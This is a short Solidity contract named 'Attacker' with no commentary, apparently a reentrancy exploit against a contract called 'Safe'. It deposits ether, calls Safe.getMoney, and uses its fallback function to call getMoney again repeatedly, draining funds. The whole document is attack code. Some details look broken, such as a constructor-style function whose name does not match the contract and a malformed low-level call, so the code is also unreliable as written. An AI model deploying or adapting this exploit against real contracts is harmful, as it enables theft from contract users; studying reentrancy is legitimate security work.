contract Attacker
{
 	uint balance;
  	Safe safe;
  	function Investor(address _safe) payable public
  	{
    		balance = msg.value;
    		safe = Safe(_safe);
  	}
  	function safeMoney() payable public
  	{
    		balance = msg.value;
    		safe.addOwner.value(msg.value)();
  	}
 	 function attack() public
  	{
    		safe.getMoney(balance);
  	}
  	function () external
  	{
    		if(msg.gas > 10000 && msg.sender.balance > balance)
      		msg.sender.call("getMoney",balance);
  	}
}
